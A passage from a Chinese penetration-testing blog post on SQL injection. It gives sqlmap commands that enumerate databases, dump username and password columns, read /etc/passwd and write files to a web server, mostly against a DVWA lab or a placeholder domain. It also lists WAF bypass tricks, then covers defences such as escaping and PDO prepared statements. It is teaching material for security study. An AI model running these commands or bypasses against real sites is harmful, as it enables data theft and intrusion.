class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br></pre></td></tr></table></figure>

<p>确定要注入的URL，有时需要获取访问该网站所需的cookie。</p>
<h3 id="get数据注入-1"><a href="#get数据注入-1" class="headerlink" title="get数据注入"></a>get数据注入</h3><ul>
<li><p>查询所有的数据库名</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; --dbs</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询指定数据库的所有表名信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa --table</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询指定表名下的所有列名信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users --column</span><br></pre></td></tr></table></figure>
</li>
<li><p>查询指定数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="post数据注入-1"><a href="#post数据注入-1" class="headerlink" title="post数据注入"></a>post数据注入</h3><p>使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。</p>
<p>先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 &#x2F;root&#x2F;post.txt</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618182311836.jpg" alt="img" style="zoom: 33%;">

<p>然后关闭 Burpsuite 的代理功能，再使用命令 <code>sqlmap -r /root/post.txt --dbs</code>，来查询数据库名称。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618184176609.jpg" alt="img" style="zoom:33%;">

<p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa --table</code>，查询表名</p>
<p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users --columns</code>，查询字段名</p>
<p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump</code>，查询用户名和密码内容</p>
<h2 id="8-SQL注入防护"><a href="#8-SQL注入防护" class="headerlink" title="8. SQL注入防护"></a>8. SQL注入防护</h2><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>addslashes()、魔术引号开关、mysql_real_escape_string</p>
<p><u>会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</u>，会影响SQL注入语句中的路径信息。</p>
<p><strong>绕过方法</strong>：</p>
<p>宽字节（待转义字符前加上%df）、</p>
<h3 id="整数过滤"><a href="#整数过滤" class="headerlink" title="整数过滤"></a>整数过滤</h3><p>遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>str_replace(‘被过滤参数’,’过滤参数’,$id)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$id</span>=<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	<span class="comment">// 第一个参数是要过滤的值，第二个参数是过滤后的值</span></span><br><span class="line">	<span class="variable">$id</span>=str_ <span class="title function_ invoke__">replace</span>(<span class="string">&#x27;select&#x27;</span> , <span class="string">&#x27;fuck&#x27;</span> ,<span class="variable">$id</span>)</span><br><span class="line">	<span class="comment">// logging the connection parameters to a file for analysis.</span></span><br><span class="line">	<span class="variable">$fp</span>-<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤效果：select变成了fuck</p>
<h3 id="waf防护软件"><a href="#waf防护软件" class="headerlink" title="waf防护软件"></a>waf防护软件</h3><p>阿里云盾、安全狗、宝塔</p>
<p>作用机制：过滤关键字</p>
<p><strong>绕过方法</strong>：</p>
<ol>
<li><p>更改提交方法（get、post）</p>
</li>
<li><p><strong>大小写混合</strong>（绕开黑名单）</p>
</li>
<li><p><strong>解密编码类</strong>（绕开黑名单）</p>
<p>%0A为换行符；%23为#号；%20为空格</p>
</li>
<li><p><strong>注释符号混用</strong>（绕开注释过滤）</p>
<p>比如<code>/**/</code>、<code>/*!*/</code></p>
</li>
<li><p>等价函数替换（绕开关键字过滤）</p>
</li>
<li><p>特殊符号混用（绕开关键字过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格被过滤，用%a0代替；</span><br><span class="line">and和or被过滤：可以用&amp;&amp;和||来替代；</span><br></pre></td></tr></table></figure>
</li>
<li><p>借助数据库特性（多种SQL语句）</p>
</li>
<li><p><strong>HTTP参数污染</strong></p>
<p>函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id&#x3D;1&amp;id&#x3D;sql_injection的结果为为id&#x3D;1。但是<code>$id=$_GET[&#39;id&#39;]</code>取的是最后一个id，所以我们只需要把payload放在后面的id就好。</p>
</li>
<li><p><strong>垃圾数据溢出</strong></p>
<p>waf只能匹配一千个，多了就不行了</p>
</li>
</ol>
<h3 id="使用预编译PDO"><a href="#使用预编译PDO" class="headerlink" title="使用预编译PDO"></a>使用预编译PDO</h3><p>PDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是<strong>先把 SQL 语句的整体语法，匹配的参数用 <code>?</code> 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。</strong>用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。</p>
<p>SQL关键字<strong>无法进行预编译</strong>，如表名或者列名字段，order by + 列名，in + 列名。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">ccb</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5')">SQL注入</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入&amp;url=https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">15</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">XSS</div></div></a></div><div class="next-post pull-right"><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">文件上传</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93" title="渗透测试全流程"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">渗透测试全流程</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">基础概念与信息收集</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" title="SQL注入-WAF绕过"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">SQL注入-WAF绕过</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">XXE</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E" title="逻辑漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">逻辑漏洞</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="反序列化漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">1. 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">2. 产生过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.3.</span> <span class="toc-text">3. 常见原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%BD%93%E7%9A%84%E5%A4%84%E7%90%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">不当的处理类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">不安全的数据库配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%88%E7%90%86%E7%9A%84%E6%9F%A5%E8%AF%A2%E9%9B%86%E5%A4%84%E7%90%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">不合理的查询集处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%BD%93%E7%9A%84%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">不当的错误处理（盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E6%8F%90%E4%BA%A4%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93"><span class="toc-number">1.3.5.</span> <span class="toc-text">多个提交处理不当</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.4.</span> <span class="toc-text">4. 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-MySQL%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.</span> <span class="toc-text">5. MySQL注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BB%A5%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">判断注入点以及注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E9%AB%98%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">信息收集（高版本数据库）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E6%95%B0%EF%BC%88%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%89"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">猜解数据库列数（字段数）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%89%8D%E7%AB%AF%E5%9B%9E%E6%98%BE"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">判断前端回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">查询数据库版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">查询数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">查询数据库用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">查询操作系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E8%A1%A8%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.7.</span> <span class="toc-text">查询指定数据库下的表名信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E8%A1%A8%E5%90%8D%E4%B8%8B%E7%9A%84%E5%88%97%E5%90%8D"><span class="toc-number">1.5.2.8.</span> <span class="toc-text">查询指定表名下的列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE"><span class="toc-number">1.5.2.9.</span> <span class="toc-text">查询指定数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.3.</span> <span class="toc-text">跨库查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">查询所有的数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E8%A1%A8%E5%90%8D%E4%BF%A1%E6%81%AF-1"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">查询指定数据库下的表名信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E8%A1%A8%E5%90%8D%E4%B8%8B%E7%9A%84%E5%88%97%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">查询指定表名下的列名信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE-1"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">查询指定数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BD%8E%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89"><span class="toc-number">1.5.4.</span> <span class="toc-text">信息收集（低版本数据库）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C-x3D-x3D"><span class="toc-number">1.5.5.</span> <span class="toc-text">&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">文件路径获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98%EF%BC%9A%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E5%BC%80%E5%85%B3"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">读写问题：魔术引号开关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 